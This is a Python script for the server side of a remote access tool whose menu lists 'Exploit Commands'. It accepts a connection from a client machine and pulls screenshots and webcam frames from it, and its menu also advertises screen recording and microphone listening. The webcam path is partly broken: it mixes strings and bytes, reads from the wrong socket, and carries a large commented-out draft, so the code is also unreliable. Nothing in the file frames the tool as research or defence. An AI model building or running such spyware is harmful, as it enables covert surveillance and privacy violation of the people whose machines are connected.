#!/usr/bin/env python3
import socket 
import sys
import os
from datetime import datetime
import cv2
import pickle
import io

host = socket.gethostbyname("") 
port = 8080
sock = None
conn = None

def create_server():
    try:
        global sock
        sock = socket.socket()
        print("Server started on " + host)
    except socket.error as msg:
        print("Socket Creation ERROR: " + str(msg))

def bind_socket():
    try:
        print("Binding the Port " + str(port)) 
        sock.bind((host, port))
        sock.listen(5)
    except socket.error as msg:
        print("Socket Binding error " + str(msg) + "\n" + "Retrying...")
        bind_socket()

def socket_accept():
    global conn
    conn, addr = sock.accept()

    print("\nConnection has been established | " + " IP " + addr[0] + " | Port " + str(addr[1]))
    print("WARNING: Type '--help' for usage information.\n")
    
    send_commands()

def show_usage():
    print("\n### Exploit Commands ###\n")
    print("[S] Take a screenshot")
    print("[R] Show screen recording")
    print("[W] View webcam")
    print("[M] Listen mic")
    print("[Q] Quit script")
    print("\n")

def send_commands():
    cmd = input("$ ")

    if cmd == "--help" or cmd == "h":
        show_usage()
    elif cmd == "S" or cmd == "s":
        conn.send(cmd.encode())
        download_screenshot(conn)
    elif cmd == "R" or cmd == "r":
        conn.send(cmd.encode())
    elif cmd == "W" or cmd == "w":
        conn.send(cmd.encode())
        view_webcam()
    elif cmd == "Q" or cmd == "q":
        sock.close()
        sys.exit()
    else:
        print("Unknown command. Try Again!")
    
    send_commands()

def view_webcam():
    cam_status = conn.recv(1024).decode() #check webcam existence
    print("Camera " + cam_status)

    if cam_status != "ON":
        return
    
    conn.send("GET\r\n".encode())
    data = conn.recv(1024).decode()

    if data == "OK":
        conn.send("GET SIZE\r\n".encode())
        data = conn.recv(1024).decode()
        
        if data.startswith("SIZE"):
            size = int(data.split()[1])
            conn.send("GET STREAM\r\n".encode())
            
            data = ''
            while len(data) < size:
                data += sock.recv(65536) #64Kb
                if not data:
                    break
            
                txt = data.strip("\r\n")

                if 'EOF' in str(txt):
                    break
                                   
    frame = pickle.loads(data)
    print(frame)



    """
    if status == "Camera found.":
        while True: 
            size = int(conn.recv(1024).decode())
            conn.send("byte_size received".encode())
            print(str(size) + "\n")

            if not size:
                break

            data = b''

            while size > 0:
                print(str(size))
                buffer_size = 65536 # 64Kb
                
                package = conn.recv(buffer_size)
                if not package:
                    break
                
                data += package
                size -= len(package)

            frame = pickle.loads(data)
            print(frame)
  
            cv2.imshow('Client Webcam', frame)  
            conn.send("frame received".encode())
            
           
            if cv2.waitKey(1) == ord('q'):
                cv2.destroyWindow("Client Webcam")
                conn.send("close".encode())
                status = conn.recv(1024).decode()
                break
            
            conn.send("continue".encode())
            status = conn.recv(1024).decode()
    """            

def download_screenshot(conn):
    print("\nColecting Screenshot...")
    data = conn.recv(1024)
    filesize = data.decode('utf-8')

    date = datetime.now()
    str_date = date.strftime("%d-%m-%Y %H'%M'%S")

    filename = "Screenshot_" + str_date    
    path = filename + ".png"

    print("Creating File...Alocating memory...")

    f = open(filename + ".png", 'wb')

    data = conn.recv(1024)
    totalRecv = len(data)
    f.write(data)
    
    while totalRecv < float(filesize):
        data = conn.recv(1024)
        totalRecv += len(data)
        f.write(data)
        print("{0:.2f}".format((totalRecv/float(filesize)) * 100) + \
                "% Done...", end = "\r")
        conn.send("Downloading".encode('utf-8'))

    print("\nScreenshot received!\n")
    conn.send("Download Finished!".encode('utf-8'))

if __name__ == '__main__':
    create_server()
    bind_socket()
    socket_accept()
